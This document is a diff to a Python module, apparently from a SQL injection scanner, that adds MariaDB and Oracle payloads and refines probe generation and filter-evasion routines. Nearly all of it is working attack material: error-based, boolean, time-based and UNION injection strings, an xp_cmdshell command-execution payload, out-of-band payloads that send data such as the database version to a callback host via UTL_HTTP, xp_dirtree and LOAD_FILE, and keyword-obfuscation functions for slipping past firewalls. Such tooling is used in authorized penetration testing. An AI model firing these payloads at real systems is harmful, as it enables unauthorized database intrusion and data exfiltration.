@@ -45,7 +45,7 @@ def make_marker() -> str:
 
 # ---------------------------------------------------------------------------
 # Error-based payloads
-# Keys: "generic", "mysql", "mssql", "postgres", "sqlite"
+# Keys: "generic", "mysql", "mariadb", "mssql", "postgres", "sqlite", "oracle"
 # ---------------------------------------------------------------------------
 
 ERROR_PAYLOADS: dict[str, List[str]] = {
@@ -54,45 +54,61 @@ ERROR_PAYLOADS: dict[str, List[str]] = {
         '"',
         "';",
         '";',
-        "'--",
-        '"--',
+        "'-- -",
+        '"-- -',
+        "'#",
         "' OR '1'='1",
-        "' OR 1=1--",
-        "' AND 1=CONVERT(int,'a')--",
+        "' OR 1=1-- -",
+        "' AND 1=CONVERT(int,'a')-- -",
         "1'",
         "1\"",
         "1`",
         "\\",
-        "' AND EXTRACTVALUE(1,0x0a)--",
+        "' AND EXTRACTVALUE(1,0x0a)-- -",
     ],
     "mysql": [
-        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
-        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
-        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-        "' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,VERSION())) USING utf8)))--",
-        "1 AND EXP(~(SELECT * FROM(SELECT VERSION())a))--",
+        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
+        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)-- -",
+        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+        "' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,VERSION())) USING utf8)))-- -",
+        "1 AND EXP(~(SELECT * FROM(SELECT VERSION())a))-- -",
+    ],
+    "mariadb": [
+        # MariaDB shares most MySQL error payloads but has a few unique functions
+        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
+        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)-- -",
+        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+        "' AND JSON_VALUE('{\"a\":1}','$.b')-- -",
     ],
     "mssql": [
-        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
-        "'; WAITFOR DELAY '0:0:0'--",    # safe probe, delay=0
-        "' AND 1=1/0--",
-        "' HAVING 1=1--",
-        "' GROUP BY columnnames HAVING 1=1--",
-        "'; EXEC xp_cmdshell('echo test')--",   # risk>=3 only — filtered in active.py
+        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
+        "'; WAITFOR DELAY '0:0:0'-- -",    # safe probe, delay=0
+        "' AND 1=1/0-- -",
+        "' HAVING 1=1-- -",
+        "' GROUP BY columnnames HAVING 1=1-- -",
+        "'; EXEC xp_cmdshell('echo test')-- -",   # risk>=3 only — filtered in active.py
     ],
     "postgres": [
-        "' AND 1=CAST((SELECT version()) AS int)--",
-        "' AND 1=(SELECT 1 FROM pg_sleep(0))--",   # safe, delay=0
-        "'; SELECT pg_sleep(0)--",
-        "' UNION SELECT NULL,NULL,version()--",
-        "' AND 1=1::integer--",
+        "' AND 1=CAST((SELECT version()) AS int)-- -",
+        "' AND 1=(SELECT 1 FROM pg_sleep(0))-- -",   # safe, delay=0
+        "'; SELECT pg_sleep(0)-- -",
+        "' UNION SELECT NULL,NULL,version()-- -",
+        "' AND 1=1::integer-- -",
     ],
     "sqlite": [
-        "' AND 1=CAST(sqlite_version() AS INTEGER)--",
-        "' AND typeof(1)='integer'--",
-        "' UNION SELECT sqlite_version(),NULL--",
-        "' AND randomblob(1)--",
+        "' AND 1=CAST(sqlite_version() AS INTEGER)-- -",
+        "' AND typeof(1)='integer'-- -",
+        "' UNION SELECT sqlite_version(),NULL-- -",
+        "' AND randomblob(1)-- -",
         "1' AND '1'='1",
+    ],
+    "oracle": [
+        "' AND 1=CAST((SELECT banner FROM v$version WHERE rownum=1) AS INTEGER)-- -",
+        "' AND 1=(SELECT 1 FROM dual WHERE 1=1)-- -",
+        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('invalid')-- -",
+        "' UNION SELECT NULL,NULL FROM dual-- -",
+        "' AND ROWNUM=1-- -",
+        "1 AND 1=CAST((SELECT banner FROM v$version WHERE rownum=1) AS INTEGER)-- -",
     ],
 }
 
@@ -107,6 +123,11 @@ DB_ERROR_PATTERNS: dict[str, List[str]] = {
         r"unclosed quotation mark",
         r"extractvalue\(",
         r"updatexml\(",
+    ],
+    "mariadb": [
+        r"mariadb.*error",
+        r"you have an error in your sql syntax",
+        r"warning: mariadb",
     ],
     "mssql": [
         r"microsoft sql server",
@@ -134,12 +155,19 @@ DB_ERROR_PATTERNS: dict[str, List[str]] = {
         r"near \".*\": syntax error",
         r"unrecognized token",
     ],
+    "oracle": [
+        r"ora-\d{5}",
+        r"oracle.*error",
+        r"quoted string not properly terminated",
+        r"pl/sql.*error",
+        r"from dual",
+        r"missing right parenthesis",
+    ],
     "generic": [
         r"sql syntax",
         r"sql error",
         r"syntax error",
         r"quoted string not properly terminated",
-        r"ora-\d{5}",           # Oracle
         r"microsoft ole db",
         r"error in your sql",
         r"unexpected end of sql command",
@@ -152,27 +180,28 @@ DB_ERROR_PATTERNS: dict[str, List[str]] = {
 # ---------------------------------------------------------------------------
 
 BOOLEAN_PAIRS: List[Tuple[str, str]] = [
-    # Classic AND
+    # Classic AND string context
     ("' AND '1'='1", "' AND '1'='2"),
-    ("' AND 1=1--",  "' AND 1=2--"),
-    # Numeric context
-    (" AND 1=1",     " AND 1=2"),
-    (" AND 1=1--",   " AND 1=2--"),
+    ("' AND 1=1-- -",  "' AND 1=2-- -"),
+    ("' AND 1=1#",     "' AND 1=2#"),
+    # Numeric context (no quotes needed)
+    (" AND 1=1",       " AND 1=2"),
+    (" AND 1=1-- -",   " AND 1=2-- -"),
     # OR variants (risk>=2)
     ("' OR '1'='1", "' OR '1'='2"),
-    ("' OR 1=1--",  "' OR 1=2--"),
+    ("' OR 1=1-- -",  "' OR 1=2-- -"),
     # Comment variants
-    ("'/**/AND/**/1=1--", "'/**/AND/**/1=2--"),
+    ("'/**/AND/**/1=1-- -", "'/**/AND/**/1=2-- -"),
     # Subquery
-    ("' AND (SELECT 1)=1--", "' AND (SELECT 1)=2--"),
+    ("' AND (SELECT 1)=1-- -", "' AND (SELECT 1)=2-- -"),
     # String length
-    ("' AND LENGTH('a')=1--", "' AND LENGTH('a')=2--"),
+    ("' AND LENGTH('a')=1-- -", "' AND LENGTH('a')=2-- -"),
 ]
 
 # Only use OR-based pairs when risk >= 2 (they can modify data if stacked)
 BOOLEAN_PAIRS_RISK2: List[Tuple[str, str]] = [
     ("' OR '1'='1", "' OR '1'='2"),
-    ("' OR 1=1--",  "' OR 1=2--"),
+    ("' OR 1=1-- -",  "' OR 1=2-- -"),
     ("1 OR 1=1",    "1 OR 1=2"),
 ]
 
@@ -186,31 +215,47 @@ BOOLEAN_PAIRS_RISK2: List[Tuple[str, str]] = [
 TIME_PAYLOADS: dict[str, List[str]] = {
     "auto": [
         # Try each DBMS in order; first one that works identifies the DB
-        "' AND SLEEP({delay})--",
-        "' AND pg_sleep({delay})--",
-        "'; WAITFOR DELAY '0:0:{delay}'--",
-        "' AND randomblob(100000000)--",
+        "' AND SLEEP({delay})-- -",
+        "' AND SLEEP({delay})#",
+        "' AND pg_sleep({delay})-- -",
+        "'; WAITFOR DELAY '0:0:{delay}'-- -",
+        "' AND randomblob(100000000)-- -",
+        "' AND 1=(SELECT 1 FROM dual WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}))-- -",
     ],
     "mysql": [
-        "' AND SLEEP({delay})--",
-        "' OR SLEEP({delay})--",
-        "1' AND SLEEP({delay})--",
-        "' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--",
-        "' AND BENCHMARK({bench},MD5(1))--",
+        "' AND SLEEP({delay})-- -",
+        "' AND SLEEP({delay})#",
+        "' OR SLEEP({delay})-- -",
+        "1' AND SLEEP({delay})-- -",
+        " AND SLEEP({delay})-- -",
+        "' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)-- -",
+        "' AND BENCHMARK({bench},MD5(1))-- -",
+    ],
+    "mariadb": [
+        "' AND SLEEP({delay})-- -",
+        "' AND SLEEP({delay})#",
+        " AND SLEEP({delay})-- -",
+        "' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)-- -",
     ],
     "mssql": [
-        "'; WAITFOR DELAY '0:0:{delay}'--",
-        "' AND 1=1; WAITFOR DELAY '0:0:{delay}'--",
-        "'; IF (1=1) WAITFOR DELAY '0:0:{delay}'--",
+        "'; WAITFOR DELAY '0:0:{delay}'-- -",
+        "' AND 1=1; WAITFOR DELAY '0:0:{delay}'-- -",
+        "'; IF (1=1) WAITFOR DELAY '0:0:{delay}'-- -",
     ],
     "postgres": [
-        "' AND pg_sleep({delay})--",
-        "'; SELECT pg_sleep({delay})--",
-        "' OR pg_sleep({delay})--",
-        "' AND 1=1 AND pg_sleep({delay})--",
+        "' AND pg_sleep({delay})-- -",
+        "'; SELECT pg_sleep({delay})-- -",
+        "' OR pg_sleep({delay})-- -",
+        "' AND 1=1 AND pg_sleep({delay})-- -",
     ],
     "sqlite": [
-        "' AND randomblob({blob_size})--",   # {blob_size} = delay * 10_000_000
+        "' AND randomblob({blob_size})-- -",   # {blob_size} = delay * 10_000_000
+    ],
+    "oracle": [
+        # Oracle has no simple sleep — use DBMS_PIPE.RECEIVE_MESSAGE (requires execute priv)
+        # or heavy CPU via DECODE to simulate delay
+        "' AND 1=(SELECT 1 FROM dual WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}))-- -",
+        "' AND 1=(SELECT COUNT(*) FROM all_objects WHERE rownum<{bench})-- -",
     ],
 }
 
@@ -220,21 +265,61 @@ TIME_PAYLOADS: dict[str, List[str]] = {
 # ---------------------------------------------------------------------------
 
 def order_by_probes(max_cols: int = 20) -> List[str]:
-    """Generate ORDER BY N probes to determine column count."""
-    return [f"' ORDER BY {n}--" for n in range(1, max_cols + 1)]
+    """
+    Generate ORDER BY N probes to determine column count.
+
+    Four variants are emitted for each column count, covering both SQL
+    injection contexts:
+
+    - String context (``'`` prefix): used when the param value is quoted
+    - Numeric context (no prefix): used when the param is bare numeric
+    - Two comment terminators each: ``-- -`` (ANSI) and ``#`` (MySQL)
+
+    The probes are interleaved: string then numeric at each N so the
+    scanner tries all styles before advancing to N+1 — allowing early
+    termination on whatever comment style/context matches.
+    """
+    probes = []
+    for n in range(1, max_cols + 1):
+        probes.append(f"' ORDER BY {n}-- -")
+        probes.append(f"' ORDER BY {n}#")
+        probes.append(f" ORDER BY {n}-- -")   # numeric context
+        probes.append(f" ORDER BY {n}#")       # numeric context, MySQL hash
+    return probes
 
 
 def union_null_probes(col_count: int, marker: str) -> List[str]:
     """
     Generate UNION SELECT probes for a known column count.
-    Tries placing the marker in each column position.
+
+    For each column position, four variants are generated:
+    - String context (``'`` prefix) + ``-- -`` comment
+    - String context (``'`` prefix) + ``#`` comment
+    - Numeric context (no prefix) + ``-- -`` comment
+    - Numeric context (no prefix) + ``#`` comment
+
+    Within each variant the marker is placed as a string literal at the
+    target position and a ``CAST`` alternative is also emitted to handle
+    type-strict DBMSes (PostgreSQL, MSSQL) where a string literal in an
+    integer column would cause a type-mismatch error.
     """
     payloads = []
     for pos in range(col_count):
-        cols = ["NULL"] * col_count
-        cols[pos] = f"'{marker}'"
-        payload = "' UNION SELECT " + ",".join(cols) + "--"
-        payloads.append(payload)
+        # String literal marker (works for MySQL, SQLite)
+        cols_str = ["NULL"] * col_count
+        cols_str[pos] = f"'{marker}'"
+        # CAST marker (works for PostgreSQL, MSSQL where column is typed)
+        cols_cast = ["NULL"] * col_count
+        cols_cast[pos] = f"CAST('{marker}' AS CHAR)"
+
+        for cols in (cols_str, cols_cast):
+            inner = ",".join(cols)
+            # String context
+            payloads.append(f"' UNION SELECT {inner}-- -")
+            payloads.append(f"' UNION SELECT {inner}#")
+            # Numeric context
+            payloads.append(f" UNION SELECT {inner}-- -")
+            payloads.append(f" UNION SELECT {inner}#")
     return payloads
 
 
@@ -258,6 +343,10 @@ OOB_PAYLOADS: dict[str, List[str]] = {
         "' AND (SELECT dblink_send_query('host={callback}','SELECT 1'))--",
     ],
     "sqlite": [],  # SQLite has no native OOB capability
+    "oracle": [
+        "' UNION SELECT UTL_HTTP.REQUEST('http://{callback}') FROM dual-- -",
+        "' AND 1=(SELECT UTL_HTTP.REQUEST('http://{callback}/') FROM dual)-- -",
+    ],
     "auto": [
         "'; EXEC master..xp_dirtree '//{callback}/a'--",
         "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.{callback}\\\\a'))--",
@@ -276,15 +365,16 @@ def apply_evasion(payload: str, evasion: str) -> str:
         return payload
 
     if evasion == EVASION_SQL_COMMENT:
-        # Insert /**/ between SQL keywords
+        # Insert /**/ between SQL keywords (outside of string literals)
         result = payload
         for kw in ("SELECT", "UNION", "WHERE", "AND", "OR", "FROM", "INSERT", "UPDATE"):
-            result = result.replace(kw, f"/**/\n{kw}/**/")
+            result = result.replace(kw, f"/**/{kw}/**/")
         return result
 
     if evasion == EVASION_SQL_WHITESPACE:
-        # Replace spaces with tabs and newlines
-        return payload.replace(" ", "\t").replace("\t", "\r\n")
+        # Replace spaces with tabs only (do NOT then replace tabs with CRLF —
+        # that would double-convert spaces that were already replaced).
+        return payload.replace(" ", "\t")
 
     if evasion == EVASION_SQL_CASE:
         # Randomise case of alpha characters in SQL keywords
@@ -301,8 +391,22 @@ def apply_evasion(payload: str, evasion: str) -> str:
         return urllib.parse.quote(payload, safe="")
 
     if evasion == EVASION_SQL_MULTILINE:
-        # Wrap keywords in multi-line comments
-        return payload.replace(" ", "/*\n*/")
+        # Wrap spaces in multi-line comments, but only outside single-quoted strings
+        # to avoid corrupting WAITFOR DELAY '0:0:4' style payloads.
+        result_parts: list[str] = []
+        in_string = False
+        for ch in payload:
+            if ch == "'" and not in_string:
+                in_string = True
+                result_parts.append(ch)
+            elif ch == "'" and in_string:
+                in_string = False
+                result_parts.append(ch)
+            elif ch == " " and not in_string:
+                result_parts.append("/*\n*/")
+            else:
+                result_parts.append(ch)
+        return "".join(result_parts)
 
     if evasion == EVASION_CASE_MIXING:
         return payload.swapcase()
